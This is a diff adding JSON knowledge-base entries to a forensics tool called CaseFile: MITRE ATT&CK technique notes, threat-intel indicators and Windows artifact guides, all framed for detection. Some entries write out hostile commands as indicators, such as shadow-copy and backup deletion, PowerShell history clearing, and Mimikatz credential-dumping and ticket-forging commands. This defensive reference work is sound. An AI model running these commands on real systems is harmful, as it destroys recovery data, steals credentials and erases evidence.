+  {"id": "TOOL-EZCMD-EVTXECMD", "source": "tool_reference", "title": "EZ Tools: EvtxECmd", "content": "EvtxECmd.exe parses Windows Event Log (.evtx) files. CaseFile command: EvtxECmd.exe -f [file.evtx] --csv [output_dir] --csvf [output.csv] --maps [maps_dir]. Maps directory provides field extraction templates per Event ID. Output columns: EventRecordId, TimeCreated, EventId, Level, Provider, Channel, Computer, Security (UserID), Payload (raw XML), MapDescription, UserName, RemoteHost, ExecutableInfo, PayloadData1-6. Without maps, PayloadData fields may be empty -- ensure maps directory is provided.", "tags": ["tool_reference", "evtxecmd", "event_logs", "ez_tools", "windows"]},
+  {"id": "TOOL-EZCMD-RECMD", "source": "tool_reference", "title": "EZ Tools: RECmd", "content": "RECmd.exe parses Windows Registry hive files. CaseFile command: RECmd.exe -f [hive] --csv [output_dir] --csvf [output.csv] --bn [batch_file]. Batch files (RECmd_Batch_MC.reb) provide named extractions for common forensic keys. Output: ValueName, ValueData, ValueData2, ValueData3, ValueSlack, Hive, HivePath, HiveType, LastWriteTimestamp, Category, Description. Key batch file categories: UserAssist, RecentDocs, TypedURLs, RunMRU, RunKeys, Services, ShimCache, BAM/DAM.", "tags": ["tool_reference", "recmd", "registry", "ez_tools", "windows"]},
+  {"id": "COBALT-STRIKE-INDICATORS", "source": "threat_intel", "title": "Cobalt Strike Forensic Indicators", "content": "Cobalt Strike is a commercial adversary simulation framework widely used by threat actors. Host indicators: Beacon payloads (DLL or EXE), often hex-named or dropped in Temp/AppData. Named pipes (\\\\PIPE\\\\msagent_[hex], \\\\PIPE\\\\status_[hex], \\\\PIPE\\\\mojo[hex]). Process injection from unusual parents. Default staging paths: C:\\Temp, C:\\Users\\Public, C:\\ProgramData. Network indicators: HTTP/HTTPS beaconing with jitter (not exactly regular), custom profiles mimicking CDN traffic, SMB C2 via named pipes (port 445 internally). Memory indicators: Reflective DLL loading (no file on disk), shellcode in RWX memory regions, beacon configuration extractable with cobaltstrikeparser.", "tags": ["threat_intel", "cobalt_strike", "c2", "detection", "windows"]},
+  {"id": "LATERAL-MOVEMENT-PATTERNS", "source": "methodology", "title": "Lateral Movement Pattern Recognition", "content": "Lateral movement patterns to recognize: Pass-the-Hash: Event 4624 type 3 with NTLM auth from IP address (not hostname), source and destination both domain-joined, same account appears on multiple hosts within minutes. PsExec: ADMIN$ share access, PSEXESVC service creation (Event 7045), cmd.exe spawned as SYSTEM. WMI: WmiPrvSE.exe spawning commands, Event 4624 type 3 preceding WMI activity. RDP: Event 4624 type 10, TermSrv activity, mstsc.exe in Prefetch of source. Token theft: 4624 type 2 or 3 from account that doesn't normally authenticate interactively.", "tags": ["methodology", "lateral_movement", "detection", "windows", "pass_the_hash"]},
+  {"id": "EXFIL-DETECTION", "source": "methodology", "title": "Data Exfiltration Detection", "content": "Data exfiltration detection: Staging: Large archive creation in user-writable directories before network activity (Prefetch shows 7z/rar, MFT shows archive creation timestamp). Volume: Unusually large outbound transfers (network logs, if available). Protocol: Data sent over uncommon ports or protocols (DNS tunneling, ICMP, custom C2). Destination: Connections to non-corporate IPs, cloud storage services (Dropbox, Google Drive), paste sites. Timing: Exfiltration commonly occurs at night or weekends. Evidence: LNK files showing data source, MFT showing staging directory, Prefetch showing archive tools, network connections to external IPs.", "tags": ["methodology", "exfiltration", "detection", "windows"]},
+  {"id": "NTLM-RELAY", "source": "threat_intel", "title": "NTLM Relay Attack Indicators", "content": "NTLM relay attacks capture NTLM authentication and relay to other services without cracking. Tools: Responder (captures), ntlmrelayx (relays). Detection: Multiple failed authentications from single source (Responder poisoning), Event 4624/4625 with NTLM from unexpected sources, new account creation or privilege escalation following NTLM activity, Event 4688 showing ntlmrelayx.py or Responder.py. Network: ARP poisoning artifacts, LLMNR/NBT-NS responses from unexpected hosts. Active Directory: unexpected ACL changes, new delegations.", "tags": ["threat_intel", "ntlm_relay", "credential_access", "detection", "windows", "responder"]},
+  {"id": "DCSYNC-ATTACK", "source": "threat_intel", "title": "DCSync Attack Indicators", "content": "DCSync attack uses Domain Replication Service Remote Protocol to extract credential hashes from DC without logging on interactively. Tools: Mimikatz lsadump::dcsync, Impacket secretsdump. Detection: Event 4662 on DC with object type CN=Domain, Properties including DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, from non-DC computer account. Multiple 4662 events in quick succession from single source. Unusual account with Replication rights in AD ACLs (indicator of pre-positioning).", "tags": ["threat_intel", "dcsync", "credential_access", "detection", "windows", "active_directory"]},
+  {"id": "GOLDEN-TICKET", "source": "threat_intel", "title": "Golden Ticket Attack Indicators", "content": "Golden Ticket forges Kerberos TGTs using the KRBTGT hash, granting arbitrary access. Tools: Mimikatz kerberos::golden. Detection: Event 4769 with TicketOptions indicating unusual flags, tickets with very long lifetime (10+ years), accounts authenticating to resources without prior TGT request (4768 missing before 4769), service tickets requested for services that user should not access. KRBTGT password reset events. Unusual inter-realm trust tickets.", "tags": ["threat_intel", "golden_ticket", "kerberos", "detection", "windows", "active_directory"]},
+  {"id": "PASS-THE-HASH", "source": "threat_intel", "title": "Pass-the-Hash Attack Indicators", "content": "Pass-the-Hash uses NTLM hash directly without knowing plaintext password. Tools: Mimikatz sekurlsa::pth, Impacket psexec/wmiexec. Detection: Event 4624 type 3 with NTLM authentication from IP address (pass-the-hash tools often connect by IP to bypass Kerberos), multiple authentications from same hash in short period, authentications at unusual hours, accounts authenticating from hosts they never logged into before. Source: IP-based connections vs hostname-based connections (Kerberos requires hostname resolution).", "tags": ["threat_intel", "pass_the_hash", "credential_access", "detection", "windows"]},
+  {"id": "ATT-T1134", "source": "mitre_attack", "technique_id": "T1134", "title": "Access Token Manipulation", "content": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Techniques: Token Impersonation/Theft (steal token from higher-privileged process), Create Process with Token (runas or CreateProcessWithTokenW), Make and Impersonate Token. Detection: Event 4624 type 3 with unusual account/source, Event 4616 (system time changed, often associated with token manipulation), processes running under unexpected security context, Volatility handles showing token handles between processes.", "tags": ["defense_evasion", "privilege_escalation", "token", "windows", "T1134"]},
+  {"id": "ATT-T1485", "source": "mitre_attack", "technique_id": "T1485", "title": "Data Destruction", "content": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability. Tools: rm, del, format, cipher /w (overwrites), sdelete, wiper malware, ransomware (encrypts then destroys keys). Detection: Prefetch shows destruction tool execution, MFT $BITMAP gaps (mass deletion), USN journal shows large-scale deletion operations, Volatility shows processes accessing many files rapidly, Event log gaps from log clearing preceding destruction.", "tags": ["impact", "data_destruction", "windows", "T1485", "sdelete"]},
+  {"id": "ATT-T1490", "source": "mitre_attack", "technique_id": "T1490", "title": "Inhibit System Recovery", "content": "Adversaries may delete or remove built-in data and turn off services designed to aid in recovery to prevent recovery. Methods: vssadmin delete shadows /all /quiet (delete Volume Shadow Copies), bcdedit /set {default} recoveryenabled No, wbadmin delete catalog, disabling Windows Recovery Environment. Detection: Prefetch shows vssadmin.exe or bcdedit.exe, Event ID 524 (Volume Shadow Copy deleted), command line audit showing recovery-disabling commands. Commonly seen as ransomware precursor.", "tags": ["impact", "system_recovery", "windows", "T1490", "vss", "shadow_copies"]},
+  {"id": "ATT-T1569.002", "source": "mitre_attack", "technique_id": "T1569.002", "title": "Service Execution", "content": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. Methods: sc.exe create/start, CreateService API, PSExec (creates PSEXESVC service), Metasploit getsystem (service-based privilege escalation). Detection: Event 7045 (service created), 7036 (service changed state), Prefetch showing sc.exe, services running from non-standard paths, SYSTEM-context processes spawned by services.exe unexpectedly.", "tags": ["execution", "service_execution", "windows", "T1569.002", "psexec"]},
+  {"id": "ATT-T1574.001", "source": "mitre_attack", "technique_id": "T1574.001", "title": "DLL Search Order Hijacking", "content": "Adversaries may execute their own malicious payloads by hijacking the DLL search order used to load DLLs. Windows DLL search order: application directory, System32, System, Windows, current directory, PATH. Attack: place malicious DLL in application directory that matches name of DLL loaded from System32. Detection: Amcache shows DLL execution from unexpected path, Volatility dlllist shows DLLs from user-writable paths, MFT shows DLL creation in application directory shortly before execution.", "tags": ["defense_evasion", "persistence", "dll_hijacking", "windows", "T1574.001"]},
+  {"id": "ATT-T1219", "source": "mitre_attack", "technique_id": "T1219", "title": "Remote Access Software", "content": "Adversaries may use legitimate desktop support and remote access software to establish an interactive command and control channel. Tools: TeamViewer, AnyDesk, ScreenConnect, RustDesk, GoTo, LogMeIn. Detection: Amcache/Prefetch shows remote access tool execution, network connections to remote access service infrastructure (TeamViewer servers, AnyDesk relay), MFT shows installation in unusual paths, remote access tools running outside business hours or from non-IT accounts.", "tags": ["command_and_control", "remote_access", "windows", "T1219", "anydesk", "teamviewer"]},
+  {"id": "ATT-T1016", "source": "mitre_attack", "technique_id": "T1016", "title": "System Network Configuration Discovery", "content": "Adversaries may look for details about the network configuration and settings of systems they access or through information of remote systems. Tools: ipconfig /all, netstat -ano, arp -a, route print, nslookup, nbtstat. Detection: Prefetch shows ipconfig.exe, netstat.exe, arp.exe, route.exe execution. Event 4688 with these commands in command line. Clustering of discovery commands (multiple network recon tools run within minutes indicates systematic enumeration).", "tags": ["discovery", "network_discovery", "windows", "T1016"]},
+  {"id": "ATT-T1069", "source": "mitre_attack", "technique_id": "T1069", "title": "Permission Groups Discovery", "content": "Adversaries may attempt to find group and permission settings. Tools: net localgroup administrators, net group 'Domain Admins' /domain, whoami /groups, Get-LocalGroupMember. Detection: Prefetch shows net.exe, whoami.exe execution. Event 4798 (local group membership enumerated), 4799 (security-enabled local group membership enumerated). Domain controller logs 4661 for LDAP group enumeration. Clustering with other discovery commands indicates systematic reconnaissance.", "tags": ["discovery", "permissions", "windows", "T1069", "active_directory"]},
+  {"id": "ATT-T1057", "source": "mitre_attack", "technique_id": "T1057", "title": "Process Discovery", "content": "Adversaries may attempt to get information about running processes to gain situational awareness. Tools: tasklist, Get-Process, wmic process list, ps. Detection: Prefetch shows tasklist.exe execution. Event 4688 with tasklist.exe or wmic.exe with process queries. Volatility netscan shows processes that ran network discovery. Clustering with other discovery commands. Tasklist /v provides verbose output; /svc maps processes to services -- both indicate thorough enumeration.", "tags": ["discovery", "process_discovery", "windows", "T1057"]},
+  {"id": "ATT-T1033", "source": "mitre_attack", "technique_id": "T1033", "title": "System Owner/User Discovery", "content": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly use a system, or whether a user is actively using the system. Tools: whoami, query user, qwinsta, net user, Get-LocalUser. Detection: Prefetch shows whoami.exe, query.exe execution. Event 4688 with these commands. whoami /all provides comprehensive privilege and group information -- high confidence indicator of post-exploitation reconnaissance.", "tags": ["discovery", "user_discovery", "windows", "T1033"]},
+  {"id": "ATT-T1082", "source": "mitre_attack", "technique_id": "T1082", "title": "System Information Discovery", "content": "Adversaries may attempt to get detailed information about the operating system and hardware. Tools: systeminfo, Get-ComputerInfo, msinfo32, wmic computersystem, hostname, ver. Detection: Prefetch shows systeminfo.exe, hostname.exe execution. Event 4688 with systeminfo command. systeminfo reveals OS version, patch level, domain membership, hotfixes, and network information -- comprehensive system enumeration in one command.", "tags": ["discovery", "system_info", "windows", "T1082"]},
+  {"id": "THREAT-APT-TOOLING", "source": "threat_intel", "title": "Common APT Tool Indicators", "content": "Common tools used by advanced threat actors and their forensic indicators: Mimikatz (privilege::debug, sekurlsa::logonpasswords in Prefetch/Event 4688), Cobalt Strike beacon (hex-named DLLs, named pipes), Metasploit (meterpreter, stager payloads in Temp), BloodHound/SharpHound (LDAP enumeration, collection .zip files), Impacket suite (Python-compiled executables, specific service names like BTOBTO, LRFRNQLF). Hex-named files (40-char SHA1 names) commonly indicate Cobalt Strike or similar payload staging.", "tags": ["threat_intel", "apt", "tooling", "detection", "windows", "mimikatz"]},
+  {"id": "ARTIFACT-SHIMCACHE", "source": "artifact_guide", "title": "Shimcache (AppCompatCache) Analysis", "content": "Shimcache (Application Compatibility Cache) tracks executable files that have been executed or accessed. Location: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache. Contents: Full path of executable, last modified time of file, execution flag (Windows 8+). Key forensic value: Proves file existed on system even if deleted, captures files opened by the OS for compatibility checks (some entries don't require actual execution), preserves path. Tool: AppCompatCacheParser.exe (EZ Tools). Limitations: Entry count limit varies by OS, order indicates sequence (most recent first), execution flag only reliable on Win8+.", "tags": ["shimcache", "artifact_guide", "execution", "windows", "appcompat"]},
+  {"id": "ARTIFACT-BAM-DAM", "source": "artifact_guide", "title": "BAM/DAM (Background Activity Moderator) Analysis", "content": "BAM (Background Activity Moderator) and DAM (Desktop Activity Moderator) track program execution on Windows 10+. Location: HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\[SID]. Contents: Full path of executable, last execution timestamp per user SID. Key forensic value: Per-user execution history with timestamps, persists across system reboots, captures background execution that Prefetch may miss. Tool: RECmd with batch file including BAM/DAM category. Note: BAM entries are cleared on reboot in some Windows versions -- volatile data.", "tags": ["bam", "dam", "artifact_guide", "execution", "windows"]},
+  {"id": "ARTIFACT-RECYCLE-BIN", "source": "artifact_guide", "title": "Recycle Bin Analysis", "content": "Recycle Bin stores deleted files before permanent deletion. Location: C:\\$Recycle.Bin\\[SID]\\$I[identifier].[ext] (metadata), $R[identifier].[ext] (file content). $I file contains: original filename, original path, file size, deletion timestamp. Key forensic value: Deleted files (if Recycle Bin not emptied), original location of deleted files, deletion timestamp, file content if not overwritten. Tool: RBCmd.exe (EZ Tools). Correlate deletion timestamps with attack timeline. Attackers who delete files via Recycle Bin (not Shift+Delete) leave $I metadata even after emptying.", "tags": ["recycle_bin", "artifact_guide", "deleted_files", "windows"]},
+  {"id": "ARTIFACT-SRUM", "source": "artifact_guide", "title": "SRUM (System Resource Usage Monitor) Analysis", "content": "SRUM tracks resource usage per application over 30-60 days. Location: C:\\Windows\\System32\\sru\\SRUDB.dat (ESE database). Contents: Application resource usage (CPU time, memory, network bytes sent/received per process per hour), network usage (bytes sent/received per interface per application), energy usage. Key forensic value: Network bytes sent by process (exfiltration evidence), application usage over time (attacker tool usage patterns), user activity timeline. Tool: srum-dump (Python) or Arsenal SRUM Parser. Survives process termination and log clearing.", "tags": ["srum", "artifact_guide", "network_usage", "windows", "exfiltration"]},
+  {"id": "ARTIFACT-THUMBCACHE", "source": "artifact_guide", "title": "Thumbcache Analysis", "content": "Thumbcache stores cached thumbnails of viewed images. Location: C:\\Users\\[user]\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_[size].db. Contents: Thumbnail images, associated file identifiers. Key forensic value: Proves user viewed specific image files even if originals deleted, reveals content of viewed documents with thumbnail previews, timestamps of thumbnail generation. Tool: Thumbcache Viewer (freeware). Correlate with shellbags and LNK files to reconstruct file access timeline.", "tags": ["thumbcache", "artifact_guide", "user_activity", "windows", "images"]},
+  {"id": "ARTIFACT-BITS", "source": "artifact_guide", "title": "BITS (Background Intelligent Transfer Service) Jobs", "content": "BITS manages file transfers and can be abused for persistence and stealthy downloads. Location: C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db (ESE database). Event Log: Microsoft-Windows-Bits-Client/Operational (Event IDs 59=job created, 60=job transferred, 61=job error, 3=job deleted). Contents: Job name, job type, file URLs, local file paths, creation/completion times, job state. Key forensic value: Downloads that survived reboot (BITS jobs persist), stealthy tool downloads, persistence via BITS jobs with restart triggers. Tool: BitsParser (EZ Tools).", "tags": ["bits", "artifact_guide", "persistence", "download", "windows"]},
+  {"id": "ARTIFACT-WBEM", "source": "artifact_guide", "title": "WMI Subscriptions (Persistence) Analysis", "content": "WMI event subscriptions provide fileless persistence. Location: C:\\Windows\\System32\\wbem\\Repository (WMI database). Event Log: Microsoft-Windows-WMI-Activity/Operational (Event ID 5861 for subscription creation). Components: EventFilter (triggers like 'on logon'), EventConsumer (action like 'run script'), FilterToConsumerBinding (links them). Key forensic value: Fileless persistence mechanism, survives reboot, difficult to detect without WMI repository parsing. Tools: PyWMIPersistenceFinder, WMI Explorer. Attackers use WMI for persistence when file-based methods are blocked.", "tags": ["wmi", "artifact_guide", "persistence", "windows", "fileless"]},
+  {"id": "CORRELATION-PROCESS", "source": "methodology", "title": "Process Correlation Across 4 Sources", "content": "CaseFile correlates process/binary presence across 4 artifact sources to determine confidence: Amcache (was binary installed/first seen?), Prefetch (was binary executed and when?), MFT (does/did file exist on disk with what timestamps?), Memory/Volatility pslist+psscan (is/was process running at acquisition time?). Verdict logic: All 4 present = CONFIRMED_RUNNING. No memory + 2+ disk sources = CONFIRMED_HISTORICAL. Memory only = MEMORY_ONLY (possible injection). Amcache only = INSTALLED_NEVER_RAN. Contradictions (in memory but not on disk, or execution before creation) = new finding. This is deterministic -- no LLM involved in verdict calculation.", "tags": ["methodology", "correlation", "casefile", "detection", "windows"]},
+  {"id": "CASEFILE-LAWS", "source": "casefile_reference", "title": "CaseFile Investigation Laws", "content": "CaseFile enforces 7 investigation laws: Law 1 (Read-Only Evidence) - never write to evidence/, only read. Law 2 (MCP First) - always use MCP tools, never raw shell commands for parsing. Law 3 (CONFIRMED requires 2+ sources) - single-source findings must be INFERRED. Law 4 (Evidence Quotes required) - CONFIRMED findings must include exact_value from tool output. Law 5 (Audit Trail) - every tool call logged to audit/mcp.jsonl with invocation_id. Law 6 (Path Confinement) - all paths must resolve within CASEFILE_CASE_ROOT. Law 7 (No Verdict Speculation) - correlate_evidence() determines verdict, not LLM reasoning.", "tags": ["casefile_reference", "laws", "methodology", "investigation"]},
+  {"id": "CASEFILE-WORKFLOW", "source": "casefile_reference", "title": "CaseFile Investigation Workflow", "content": "Standard CaseFile investigation workflow: 1) ingest.sh - extract artifacts from E01 to analysis/. 2) parse_amcache() - get execution history with SHA1 hashes. 3) parse_prefetch() - get execution counts and timing. 4) parse_event_logs() - get authentication and service events. 5) parse_registry() - get persistence and configuration. 6) parse_mft() - get file system timeline with timestomping detection. 7) parse_memory() - get live process and network state. 8) correlate_evidence() - cross-source verdict per process. 9) record_finding() - document with evidence_quotes. 10) casefile-approve - human review and approval. 11) generate_dataset_doc.py - update documentation.", "tags": ["casefile_reference", "workflow", "investigation", "methodology"]},
+  {"id": "CASEFILE-EVIDENCE-QUOTES", "source": "casefile_reference", "title": "CaseFile Evidence Quotes Schema", "content": "Evidence quotes link findings to specific tool output. Required for CONFIRMED findings. Schema: {tool: str, invocation_id: str, field: str, exact_value: str, timestamp: ISO8601}. Rules: exact_value must be copied verbatim from tool output, not paraphrased. invocation_id must match an entry in audit/mcp.jsonl. field names the CSV column or JSON key the value came from. Tier 1 grounding verifies invocation_id exists in audit log. Tier 2 grounding verifies exact_value exists in csv_files output. Example: {tool: parse_amcache, invocation_id: inv_abc123, field: FullPath, exact_value: C:\\Windows\\Temp\\CSRSS.EXE, timestamp: 2018-03-22T10:22:14Z}", "tags": ["casefile_reference", "evidence_quotes", "grounding", "methodology"]},
+  {"id": "ATT-T1210", "source": "mitre_attack", "technique_id": "T1210", "title": "Exploitation of Remote Services", "content": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside a network. Common exploits: EternalBlue (MS17-010/SMB), BlueKeep (CVE-2019-0708/RDP), PrintNightmare (CVE-2021-34527), Log4Shell (CVE-2021-44228). Detection: Event logs showing exploitation attempts (malformed packets, crashes), new process creation from network service (svchost spawning cmd.exe), patching audit (missing critical patches via systeminfo hotfix output), memory artifacts of shellcode execution.", "tags": ["lateral_movement", "exploitation", "windows", "T1210", "CVE"]},
+  {"id": "ATT-T1078.002", "source": "mitre_attack", "technique_id": "T1078.002", "title": "Domain Accounts", "content": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion. Detection: Domain account used for interactive logon on server (type 2 on non-workstation), domain admin account used from workstation that is not a PAW (Privileged Access Workstation), domain accounts authenticating from IP addresses outside corporate range, domain service accounts with interactive logons.", "tags": ["credential_access", "domain_accounts", "windows", "T1078.002", "active_directory"]},
+  {"id": "ATT-T1110", "source": "mitre_attack", "technique_id": "T1110", "title": "Brute Force", "content": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Detection: Event ID 4625 (failed logon) spikes from single source, multiple accounts targeted from single IP (credential stuffing), Account Lockout events (4740), Kerberos pre-authentication failures (4771). Password spray pattern: many accounts each tried once at intervals to avoid lockout. Response: identify source IP, check if internal (lateral movement) or external (initial access).", "tags": ["credential_access", "brute_force", "windows", "T1110", "4625", "4740"]},
+  {"id": "WINDOWS-REGISTRY-KEYS", "source": "windows_baseline", "title": "Key Registry Persistence Locations", "content": "Primary registry persistence mechanisms: Run keys (execute on user logon): HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run[Once]. Services: HKLM\\SYSTEM\\CurrentControlSet\\Services. Boot execute: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute. Winlogon: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon (Userinit, Shell). AppInit DLLs: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs. Image File Execution Options (debugger hijacking): HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\[process.exe]\\Debugger.", "tags": ["windows_baseline", "registry", "persistence", "windows"]},
+  {"id": "NETWORK-ANALYSIS", "source": "methodology", "title": "Memory-Based Network Analysis", "content": "Volatility netscan reveals network state at acquisition time. Analysis approach: 1) List all ESTABLISHED connections - these represent active C2 or lateral movement. 2) Check LISTENING ports against expected services. 3) Identify connections from unexpected processes (explorer.exe, Word.exe connecting outbound). 4) Look for regular intervals in connection timestamps (beacon pattern). 5) Cross-reference foreign IPs with known threat intelligence. 6) Check processes with multiple connections to same IP (repeated C2 beaconing). Key: netscan only captures state at acquisition -- completed exfiltration may not appear.", "tags": ["methodology", "network_analysis", "memory", "volatility", "windows"]},
+  {"id": "VOLATILITY-HIDDEN-PROCESS", "source": "methodology", "title": "Hidden Process Detection with Volatility", "content": "Rootkits hide processes by unlinking from EPROCESS list. Detection: Compare pslist output (EPROCESS linked list walk) with psscan output (pool tag scanning - finds unlinked processes). Processes in psscan but NOT in pslist are hidden. Steps: 1) parse_memory with plugin pslist, get all PIDs. 2) parse_memory with plugin psscan, get all PIDs. 3) PIDs in psscan not in pslist = rootkit-hidden processes. 4) Investigate hidden PIDs for network connections and parent-child relationships. Note: ExitTime populated in psscan for terminated processes.", "tags": ["methodology", "memory", "rootkit", "hidden_process", "volatility", "windows"]},
+  {"id": "MFT-TIMELINE-ANALYSIS", "source": "methodology", "title": "MFT-Based Timeline Analysis", "content": "MFT timestamps provide file system activity timeline. Analysis steps: 1) Sort MFT by Created0x10 (SI creation) to find new files in attack window. 2) Filter by suspicious paths (Temp, AppData, ProgramData, Users\\Public). 3) Check SiFlags column for SI<FN flag (timestomping). 4) Cross-reference creation timestamps with Prefetch/Amcache execution times. 5) Look for clustering (multiple files created within seconds = dropper activity). 6) Check file extensions vs actual content (renamed executables). Key: SI timestamps are easily modified; FN timestamps require kernel-level manipulation.", "tags": ["methodology", "mft", "timeline", "windows", "forensics"]},
+  {"id": "ATT-T1046", "source": "mitre_attack", "technique_id": "T1046", "title": "Network Service Discovery", "content": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure. Tools: nmap, masscan, netstat, port scanners, sc \\\\[host] query. Detection: Prefetch shows nmap.exe, masscan.exe (rare on corporate hosts). Volatility netscan shows rapid sequential connection attempts to multiple ports/hosts (port scan pattern). Event logs on scanned hosts show multiple rejected connections. Network logs show SYN packets without established connections.", "tags": ["discovery", "network_scan", "windows", "T1046"]},
+  {"id": "ANTI-FORENSICS-DETECTION", "source": "methodology", "title": "Anti-Forensics Detection Checklist", "content": "Systematic anti-forensics detection: 1) Log clearing: Event 1102/104, wevtutil in Prefetch, timeline gaps in event logs. 2) Secure deletion: sdelete/cipher in Prefetch, Amcache showing secure deletion tools, $BITMAP gaps in MFT. 3) Timestomping: SI<FN in MFT output. 4) Shadow copy deletion: vssadmin in Prefetch, Event 524. 5) Audit policy changes: Event 4719. 6) Tool deletion: Prefetch proves execution of deleted binaries. 7) History clearing: Browser history gaps, Recent Documents gaps. 8) USB write-protection changes: HKLM\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies. Anti-forensics actions bound the attack timeline -- they occur at beginning (cover tracks during intrusion) or end (cleanup during exit).", "tags": ["methodology", "anti_forensics", "detection", "windows"]},
+  {"id": "ATT-T1566.001", "source": "mitre_attack", "technique_id": "T1566.001", "title": "Spearphishing Attachment", "content": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Common attachments: Office documents with macros (.doc, .xls, .xlsm), PDF with embedded JavaScript, ISO/IMG files (bypass Mark-of-the-Web), LNK files in ZIP archives. Detection: Office application (winword.exe, excel.exe) spawning cmd.exe, powershell.exe, wscript.exe (parent-child chain via Event 4688). New files created in user Downloads/Temp after email open. Amcache/Prefetch shows script interpreters executed from Office macro context.", "tags": ["initial_access", "phishing", "windows", "T1566.001", "macro"]},
+  {"id": "ATT-T1190", "source": "mitre_attack", "technique_id": "T1190", "title": "Exploit Public-Facing Application", "content": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using a software vulnerability. Common targets: Web servers (IIS, Apache), Exchange, VPN appliances (Citrix, Pulse, Fortinet), RDP. Detection: Web server process spawning cmd.exe/powershell.exe (IIS: w3wp.exe -> cmd.exe), new files dropped to webroot (web shells), unusual outbound connections from web server process, Event logs showing exploitation patterns (repeated failed requests followed by shell commands).", "tags": ["initial_access", "exploitation", "windows", "T1190", "web_shell"]},
+  {"id": "ATT-T1505.003", "source": "mitre_attack", "technique_id": "T1505.003", "title": "Web Shell", "content": "Adversaries may backdoor web servers with web shells as a means of establishing persistent access to systems. Web shells are scripts (.aspx, .php, .jsp, .asp) placed in web-accessible directories. Detection: MFT shows new script files created in IIS webroot (C:\\inetpub\\wwwroot), Amcache/Prefetch shows script interpreters (cscript.exe, w3wp.exe) executing unusual scripts, Event 4688 shows w3wp.exe spawning cmd.exe/powershell.exe, web access logs show POST requests to unusual file paths.", "tags": ["persistence", "web_shell", "windows", "T1505.003", "iis"]},
+  {"id": "SIGMA-SUSPICIOUS-POWERSHELL", "source": "sigma", "title": "Sigma: Suspicious PowerShell Execution", "content": "Comprehensive Sigma rules for suspicious PowerShell. High confidence indicators: -EncodedCommand with long Base64 string, IEX or Invoke-Expression following download, hidden window style (-WindowStyle Hidden), bypass execution policy (-ExecutionPolicy Bypass or -ep bypass), running from unusual parent (Excel, Word, browser), AmsiUtils bypass attempts. Medium confidence: loading System.Reflection.Assembly, unusual module imports, accessing Windows APIs via P/Invoke. Event 4104 captures script block content including after deobfuscation.", "tags": ["sigma", "powershell", "detection", "windows", "T1059.001"]},
+  {"id": "SIGMA-SUSPICIOUS-CMD", "source": "sigma", "title": "Sigma: Suspicious CMD Execution", "content": "Sigma rules for suspicious cmd.exe execution. High confidence: cmd.exe spawned by Office apps (winword, excel, powerpoint, outlook), cmd.exe with /c flag executing encoded or obfuscated commands, cmd.exe spawning network tools (net, netstat, ipconfig) from server processes. Medium confidence: cmd.exe running from Temp directory, cmd.exe with multiple pipe characters (obfuscation via caret/pipe). Parent-child: Office -> cmd.exe -> powershell.exe is definitive macro execution indicator.", "tags": ["sigma", "cmd", "detection", "windows", "T1059.003"]},
+  {"id": "THREAT-RANSOMWARE-INDICATORS", "source": "threat_intel", "title": "Ransomware Forensic Indicators", "content": "Ransomware forensic indicators: Pre-encryption: Reconnaissance (nltest, net, ADFind), credential dumping (Mimikatz), lateral movement (PsExec, RDP, WMI), shadow copy deletion (vssadmin), backup deletion (wbadmin), logging disabled (wevtutil). Encryption: High CPU/disk I/O, file rename operations (MFT shows mass modifications), ransom note creation. Post-encryption: Persistence cleanup, C2 disconnect. Artifacts: Prefetch shows ransomware executable, MFT shows mass file modification timestamps clustered in seconds-minutes, Event logs show mass file access before gap.", "tags": ["threat_intel", "ransomware", "detection", "windows"]},
+  {"id": "ARTIFACT-CONSOLEHIST", "source": "artifact_guide", "title": "Console History (PSReadLine) Analysis", "content": "PowerShell console history is stored by PSReadLine module. Location: C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. Contents: All PowerShell commands typed interactively, one per line. Key forensic value: Attacker command history (if PSReadLine installed and history not cleared), reveals reconnaissance and attack commands, persists across sessions. Attackers may clear with: Clear-History, Remove-Item ConsoleHost_history.txt, or Set-PSReadLineOption -HistorySaveStyle SaveNothing.", "tags": ["artifact_guide", "powershell", "console_history", "windows", "user_activity"]},
+  {"id": "ARTIFACT-NTDS", "source": "artifact_guide", "title": "NTDS.dit (Active Directory Database) Analysis", "content": "NTDS.dit is the Active Directory database containing all domain user hashes. Location: C:\\Windows\\NTDS\\NTDS.dit (on domain controllers only). Extraction (offline): ntdsutil, Volume Shadow Copy, DCSync (remote). Contents: User account hashes (NT hashes), password history, group memberships, last logon timestamps, account metadata. Key forensic value: Evidence of credential dumping attempts, user account history, domain compromise assessment. Analysis: secretsdump.py, Impacket. Note: Extracting NTDS.dit requires SYSTEM key from HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA.", "tags": ["artifact_guide", "active_directory", "ntds", "windows", "credential_access"]},
